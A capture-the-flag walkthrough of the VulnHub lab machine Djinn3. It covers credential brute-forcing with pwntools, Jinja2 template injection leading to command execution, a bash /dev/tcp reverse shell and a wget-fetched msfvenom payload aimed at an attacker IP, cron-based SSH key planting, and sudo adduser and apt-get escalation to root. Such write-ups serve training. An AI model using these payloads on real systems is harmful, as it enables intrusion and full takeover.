# VulnHub > Djinn3

**About Release**
Name: djinn: 3
Date release: 19 Jun 2020
Author: 0xmzfr
Series: djinn

**Description**
Level: Intermediate
flags: root.txt
Description: The machine is VirtualBox as well as VMWare compatible. The DHCP will assign an IP automatically. You’ll see the IP right on the login screen. You have to read the root flag.

**Download**
djinn3.tar.gz (Size: 2.2 GB)
Download: https://mega.nz/file/mf41GaoL#EKvK0xn7d8sjJsI444FUPbKxf2XGa13Q01zwD2jJWIg
Download (Mirror): https://download.vulnhub.com/djinn/djinn3.tar.gz
Download (Torrent): https://download.vulnhub.com/djinn/djinn3.tar.gz.torrent (Magnet)

---
### Services enumeration
Nmap discovers several open ports:
```markdown
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e6:44:23:ac:b2:d9:82:e7:90:58:15:5e:40:23:ed:65 (RSA)
|   256 ae:04:85:6e:cb:10:4f:55:4a:ad:96:9e:f2:ce:18:4f (ECDSA)
|_  256 f7:08:56:19:97:b5:03:10:18:66:7e:7d:2e:0a:47:42 (ED25519)
80/tcp    open  http    lighttpd 1.4.45
|_http-server-header: lighttpd/1.4.45
|_http-title: Custom-ers
5000/tcp  open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
31337/tcp open  Elite?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, NULL: 
|     username>
|   GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     username> password> authentication failed
|   Help: 
|     username> password>
|   RPCCheck: 
|     username> Traceback (most recent call last):
|     File "/opt/.tick-serv/tickets.py", line 105, in <module>
|     main()
|     File "/opt/.tick-serv/tickets.py", line 93, in main
|     username = input("username> ")
|     File "/usr/lib/python3.6/codecs.py", line 321, in decode
|     (result, consumed) = self._buffer_decode(data, self.errors, final)
|     UnicodeDecodeError: 'utf-8' codec can't decode byte 0x80 in position 0: invalid start byte
|   SSLSessionReq: 
|     username> Traceback (most recent call last):
|     File "/opt/.tick-serv/tickets.py", line 105, in <module>
|     main()
|     File "/opt/.tick-serv/tickets.py", line 93, in main
|     username = input("username> ")
|     File "/usr/lib/python3.6/codecs.py", line 321, in decode
|     (result, consumed) = self._buffer_decode(data, self.errors, final)
|     UnicodeDecodeError: 'utf-8' codec can't decode byte 0xd7 in position 13: invalid continuation byte
|   TerminalServerCookie: 
|     username> Traceback (most recent call last):
|     File "/opt/.tick-serv/tickets.py", line 105, in <module>
|     main()
|     File "/opt/.tick-serv/tickets.py", line 93, in main
|     username = input("username> ")
|     File "/usr/lib/python3.6/codecs.py", line 321, in decode

|     (result, consumed) = self._buffer_decode(data, self.errors, final)
|_    UnicodeDecodeError: 'utf-8' codec can't decode byte 0xe0 in position 5: invalid continuation byte
```

### Port 80
Connecting to port with our browser shows a static page with dead links. There is no robots.txt file and gobuster doesn’t find anything relevant. This seems to be a rabbit hole.

### Port 5000
This port hosts a python web server. We see a list of tickets with a number, an ID, a title, a status and a link. Clicking on the links redirects to *http://djinn.box:5000/?id=<ID>*.
Browsing the different tickets reveals the potential existence of following usernames:

jack
jason
david
freddy

### Port 31337
#### Brute forcing the authentication
This port hosts a custom application that we can connect to via netcat. It requires an authentication. I’ve developed a brute forcer that used a dictionary taken from here [https://raw.githubusercontent.com/shipcod3/Piata-Common-Usernames-and-Passwords/master/userpass.txt]

```python
#!/usr/bin/env python3

from pwn import *
import sys

host, port = 'djinn.box', 31337

# https://raw.githubusercontent.com/shipcod3/Piata-Common-Usernames-and-Passwords/master/userpass.txt

with open('userpass.txt') as f:
    data = f.readlines()

for creds in data:
    (username, password) = creds.split(' ')
    username = username.strip()
    password = password.strip()

    s = remote(host, port, level='error')
    
    s.recvuntil('username> ')
    s.sendline(username)
    s.recvuntil('password> ')
    s.sendline(password)

    msg = s.recvline()
    if b'authentication failed' not in msg:
        print("[+] Valid credentials found: {}:{}".format(username, password))
        sys.exit(0)

    s.close()
```
Running it will reveal that we can connect with *guest:guest*:
```markdown
kali@kali:/data/djinn3/files$ python3 bruteforce.py 
[+] Valid credentials found: guest:guest
```
### Supported commands
Now with valid credentials, we can play with the application. There is a help command that lists supported commands. Obviously, the most interesting feature will be open because it allows to create tickets that we can then call from the web server running on port 5000.

Let’s create a *test* ticket:
```markdown
kali@kali:~$ nc djinn.box 31337
username> guest
password> guest

Welcome to our own ticketing system. This application is still under 
development so if you find any issue please report it to mail@mzfr.me

Enter "help" to get the list of available commands.

> help

        help        Show this menu
        update      Update the ticketing software
        open        Open a new ticket
        close       Close an existing ticket
        exit        Exit
    
> open
Title: test
Description: test description
> exit
```
We confirm that the ticket has been added to the tickets list:
```markdown
</html>kali@kali:~$ curl -s http://djinn.box:5000/ | html2text 
 This ticketing software is under development, if you find any issue please
report it to admin
#ID   Title                                              Status      Link
1 2792 Add authentication to the ticket managment system. open        link
2 4567 Remove default user guest from the ticket creation open        link
       service.
3 8345 Error while updating postgres queries              In progress link
4 7723 Jack will temporarily handling the risk limit UI   open        link
5 2984 Update the user information                        In progress link
6 2973 Complete the honeypot project                      In progress link
7 2366 test                                               open        link
```

### Exploit Djinja2 template
Searching for Werkzeug exploits on the Internet led me to this interestin [post](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti) that says:

“You can try to probe {{7*'7'}} to see if the target is vulnerable. It would result in 49 in Twig, 7777777 in Jinja2, and neither if no template language is in use”

Let’s try by ourselves:
```
kali@kali:~$ nc djinn.box 31337
username> guest
password> guest

Welcome to our own ticketing system. This application is still under 
development so if you find any issue please report it to mail@mzfr.me

Enter "help" to get the list of available commands.

> open     
Title: {{7*'7'}}
Description: {{7*'7'}}
> exit
kali@kali:~$ curl -s http://djinn.box:5000/ | html2text 

**** This ticketing software is under development, if you find any issue please
report it to admin ****
# ID   Title                                              Status      Link
1 2792 Add authentication to the ticket managment system. open        link
2 4567 Remove default user guest from the ticket creation open        link
       service.
3 8345 Error while updating postgres queries              In progress link
4 7723 Jack will temporarily handling the risk limit UI   open        link
5 2984 Update the user information                        In progress link
6 2973 Complete the honeypot project                      In progress link
7 2366 test                                               open        link
8 1480 {{7*'7'}}                                          open        link
```
Our new ticket wiyth ID 1480 has been created and getting the details reveals that our payload has been interpreted as a serie of 7, which confirms that the template system is Jinja2.
```
kali@kali:~$ curl -s http://djinn.box:5000/?id=1480

        <html>
            <head>
            </head>

            <body>
                <h4>7777777</h4>
                <br>
                <b>Status</b>: open
                <br>
                <b>ID</b>: 1480
                <br>
                <h4> Description: </h4>
                <br>
                7777777
            </body>
             <footer>
              <p><strong>Sorry for the bright page, we are working on some beautiful CSS</strong></p>
             </footer> 
        </html>
```
Now with this hint, I searched for Jinja2 command injection and found these resources:

https://github.com/payloadbox/ssti-payloads).
https://raw.githubusercontent.com/payloadbox/ssti-payloads/master/Intruder/ssti-payloads.txt
At this stage, I wrote a python script that would create the tickets based on the payloads found:
```python
#!/usr/bin/env python3

from pwn import *

host, port = 'djinn.box', 31337
s = remote(host, port)

s.recvuntil('username> ')
s.sendline('guest')

s.recvuntil('password> ')
s.sendline('guest')

with open('ssti-payloads.txt') as f:
    payloads = f.readlines()

for i, payload in enumerate(payloads):

    s.recvuntil('> ')
    s.sendline('open')

    s.recvuntil('Title: ')
    s.sendline('test{}'.format(i))

    s.recvuntil('Description: ')
    s.sendline('{}'.format(payload))

s.close()
```
As we are not provided with the created ID with the open command, I haven’t been able to automatically retrieve the created content, but we can still do it manually by clicking on the links from the web application. Browsing each links one by one, I discovered that the following command was sucessfully interpreted:
```markdown
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```
Indeed, retrieving the content of the ticket reveals that files are actually listed, as expected.
```markdown
kali@kali:/data/djinn3/files$ curl -s http://djinn.box:5000/?id=2517 | html2text 
*** test27 ***

Status: open
ID: 2517
*** Description: ***

data.json static templates webapp.py
Sorry for the bright page, we are working on some beautiful CSS
kali@kali:/data/djinn3/files$ 
```
---
###Reverse shell
Now with this footprint, I tried to inject a reverse shell directly but it did not work:
```markdown
{{config.__class__.__init__.__globals__['os'].popen('bash -i >& /dev/tcp/172.16.222.128/4444 0>&1').read()}}
```
I then decided to generate a reverse shell with *msfvenom* and to force the target to download it and execute it from */tmp*. Let’s first generate our reverse shell and make it available with a python web server:
```markdown
$ msfvenom -p cmd/unix/reverse_bash lhost=172.16.222.128 lport=4444 -f raw -o revshell.sh
$ python3 -m http.server
```
Now, create a ticket with the following description:
```markdown
{{config.__class__.__init__.__globals__['os'].popen('wget http://172.16.222.128:8000/revshell.sh -O /tmp/revshell.sh').read()}}
```
Start a listener (*rlwrap nc -nlvp 4444*) and create another ticket with the following description:
```markdown
{{config.__class__.__init__.__globals__['os'].popen('bash /tmp/revshell.sh').read()}}
```
Now connect to http://djinn.box:5000 to get the list of tickets, and click on the link that corresponds to the latest ticket created. A reverse shell should be spawned to the listener window.
```markdown
kali@kali:/data/djinn3/files$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [172.16.222.128] from (UNKNOWN) [172.16.222.146] 39322
python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@djinn3:/opt/.web$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@djinn3:/opt/.web$ 
```
---
### Lateral move (www-data -> saint)
#### Uncompiling the syncer sources
Enumerating the server revealed that the */opt* directory contains compiled python resources (*.pyc):
```markdown
www-data@djinn3:/opt$ ls -la /opt
ls -la /opt
total 24
drwxr-xr-x  4 root     root     4096 Jun  4 20:26 .
drwxr-xr-x 23 root     root     4096 Jun  1 17:17 ..
-rwxr-xr-x  1 saint    saint    1403 Jun  4 20:24 .configuration.cpython-38.pyc
-rwxr-xr-x  1 saint    saint     661 Jun  4 20:24 .syncer.cpython-38.pyc
drwxr-xr-x  2 www-data www-data 4096 May 17 17:05 .tick-serv
drwxr-xr-x  4 www-data www-data 4096 Jun  4 19:11 .web
```

Download the resources and uncompile them with *uncompyle6*. Below is the uncompiled versions of the files:


```python
kali@kali:/data/djinn3/files$ /home/kali/.local/bin/uncompyle6 configuration.cpython-38.pyc 
# uncompyle6 version 3.7.4
# Python bytecode 3.8 (3413)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Warning: this version of Python has problems handling the Python 3 "byte" type in constants properly.

# Embedded file name: configuration.py
# Compiled at: 2020-06-04 16:49:49
# Size of source mod 2**32: 1343 bytes
import os, sys, json
from glob import glob
from datetime import datetime as dt

class ConfigReader:
    config = None

    @staticmethod
    def read_config(path):
        """Reads the config file
        """
        config_values = {}
        try:
            with open(path, 'r') as (f):
                config_values = json.load(f)
        except Exception as e:
            try:
                print("Couldn't properly parse the config file. Please use properl")
                sys.exit(1)
            finally:
                e = None
                del e

        else:
            return config_values

    @staticmethod
    def set_config_path():
        """Set the config path
        """
        files = glob('/home/saint/*.json')
        other_files = glob('/tmp/*.json')
        files = files + other_files
        try:
            if len(files) > 2:
                files = files[:2]
            else:
                file1 = os.path.basename(files[0]).split('.')
                file2 = os.path.basename(files[1]).split('.')
                if file1[(-2)] == 'config':
                    if file2[(-2)] == 'config':
                        a = dt.strptime(file1[0], '%d-%m-%Y')
                        b = dt.strptime(file2[0], '%d-%m-%Y')
                if b < a:
                    filename = files[0]
                else:
                    filename = files[1]
        except Exception:
            sys.exit(1)
        else:
            return filename
# okay decompiling configuration.cpython-38.pyc
```
```python
kali@kali:/data/djinn3/files$ /home/kali/.local/bin/uncompyle6 syncer.cpython-38.pyc 
# uncompyle6 version 3.7.4
# Python bytecode 3.8 (3413)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Warning: this version of Python has problems handling the Python 3 "byte" type in constants properly.

# Embedded file name: syncer.py
# Compiled at: 2020-06-01 13:32:59
# Size of source mod 2**32: 587 bytes
from configuration import *
from connectors.ftpconn import *
from connectors.sshconn import *
from connectors.utils import *

def main():
    """Main function
    Cron job is going to make my work easy peasy
    """
    configPath = ConfigReader.set_config_path()
    config = ConfigReader.read_config(configPath)
    connections = checker(config)
    if 'FTP' in connections:
        ftpcon(config['FTP'])
    else:
        if 'SSH' in connections:
            sshcon(config['SSH'])
        else:
            if 'URL' in connections:
                sync(config['URL'], config['Output'])


if __name__ == '__main__':
    main()
# okay decompiling syncer.cpython-38.pyc
```
Analyzing the sources reveals that there must be a cron job running by the user *saint* to execute *syncer.py*.

*pspy64* confirms the presence of a cronjob that executes */home/saint/.sync-data/syncer.py* every 3 minutes:
```markdown
2020/09/27 17:21:01 CMD: UID=1000 PID=29007  | /bin/sh -c /usr/bin/python3 /home/saint/.sync-data/syncer.py 
2020/09/27 17:21:01 CMD: UID=1000 PID=29006  | /bin/sh -c /usr/bin/python3 /home/saint/.sync-data/syncer.py 
2020/09/27 17:21:01 CMD: UID=0    PID=29005  | /usr/sbin/CRON -f 
2020/09/27 17:24:01 CMD: UID=1000 PID=29014  | /usr/bin/python3 /home/saint/.sync-data/syncer.py 
2020/09/27 17:24:01 CMD: UID=1000 PID=29013  | /bin/sh -c /usr/bin/python3 /home/saint/.sync-data/syncer.py 
2020/09/27 17:24:01 CMD: UID=0    PID=29012  | /usr/sbin/CRON -f 
2020/09/27 17:24:06 CMD: UID=0    PID=29019  | 
2020/09/27 17:27:01 CMD: UID=1000 PID=29023  | /bin/sh -c /usr/bin/python3 /home/saint/.sync-data/syncer.py 
2020/09/27 17:27:01 CMD: UID=1000 PID=29022  | /bin/sh -c /usr/bin/python3 /home/saint/.sync-data/syncer.py 
2020/09/27 17:27:01 CMD: UID=0    PID=29021  | /usr/sbin/CRON -f
```
We are missing some sources to fully understand the program, but what we have is enough to understand that:

there is a cron job that executes *syncer.py* every 3 minutes
the program will list all *.json* files in saint’s home and in */tmp*
if there are files which names are based on date format, with a more recent version in */tmp*, it will copy the content of the location indicated by *URL* (in the json file) to the destination indicated by *Output* (in the json file).
Let’s create a file named */tmp/27-09-2020.config.json* with the following content:
```markdown
{
    "URL": "http://172.16.222.128:8000/id_rsa.pub",
    "Output": "/home/saint/.ssh/authorized_keys"
}
```
Now run a python web server (*python3 -m http.server*) from */home/kali/.ssh* and wait for a connection from the target (max 3 min). After you see the connection to your web server, you can connect as saint:
```markdown
kali@kali:~/.ssh$ ssh saint@djinn.box
```
---
### Lateral move (saint -> jason)
Checking saint’s privileges reveals that we can run *adduser* as root without password:
```markdown
saint@djinn3:~$ sudo -l
Matching Defaults entries for saint on djinn3:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User saint may run the following commands on djinn3:
    (root) NOPASSWD: /usr/sbin/adduser, !/usr/sbin/adduser * sudo, !/usr/sbin/adduser * admin
```
Besides, further enumerating the target reveals that *jason* can run *apt-get* as root without password, but the user seems not to exist (probably removed by an admin who forgot to remove the line in the *sudoers* file):
```markdown
saint@djinn3:~$ cat /etc/sudoers
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults    env_reset
Defaults    mail_badpass
Defaults    secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:
# If you need a huge list of used numbers please install the nmap package.

saint ALL=(root) NOPASSWD: /usr/sbin/adduser, !/usr/sbin/adduser * sudo, !/usr/sbin/adduser * admin

jason ALL=(root) PASSWD: /usr/bin/apt-get
```
Let’s recreate the user jason and add him to the root group (GID 0):
```markdown
sudo adduser jason --gid 0
```
Now, let’s switch to *jason*. As expected, we can run *apt-get* as *root*:
```markdown
saint@djinn3:~$ su jason
Password: 
jason@djinn3:/home/saint$ sudo -l
[sudo] password for jason: 
Matching Defaults entries for jason on djinn3:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jason may run the following commands on djinn3:
    (root) PASSWD: /usr/bin/apt-get
```
---
### Privilege escalation (jason -> root)
Checking on [GTFOBins](https://gtfobins.github.io/gtfobins/apt-get/#sudo) reveals that we can take advantage of this to elevate our privileges:
```markdown
jason@djinn3:/home/saint$ sudo apt-get changelog apt
Get:1 https://changelogs.ubuntu.com apt 1.6.12ubuntu0.1 Changelog [449 kB]
Fetched 449 kB in 1s (708 kB/s)
root@djinn3:/home/saint# id
uid=0(root) gid=0(root) groups=0(root)
```
---
### Root flag
Let’s get the root flag:
```markdown
root@djinn3:/home/saint# cd /root
root@djinn3:/root# ls -la
total 40
drwx------  6 root root 4096 Jun  4 21:51 .
drwxr-xr-x 23 root root 4096 Jun  1 17:17 ..
lrwxrwxrwx  1 root root    9 May 17 17:33 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  3 root root 4096 May 10 02:57 .cache
drwx------  3 root root 4096 May 10 02:09 .gnupg
drwxr-xr-x  3 root root 4096 May 11 02:48 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rwxr-xr-x  1 root root  695 Jun  4 18:01 proof.sh
-rw-r--r--  1 root root   66 Jun  1 20:45 .selected_editor
drwx------  2 root root 4096 Jun  1 20:08 .ssh
root@djinn3:/root# ./proof.sh 

    _                        _             _ _ _ 
   / \   _ __ ___   __ _ ___(_)_ __   __ _| | | |
  / _ \ | '_ ` _ \ / _` |_  / | '_ \ / _` | | | |
 / ___ \| | | | | | (_| |/ /| | | | | (_| |_|_|_|
/_/   \_\_| |_| |_|\__,_/___|_|_| |_|\__, (_|_|_)
                                     |___/       
djinn-3 pwned...
__________________________________________________________________________

Proof: VGhhbmsgeW91IGZvciB0cnlpbmcgZGppbm4zID0K
Path: /root
Date: Sun Sep 27 21:47:16 IST 2020
Whoami: root
__________________________________________________________________________
```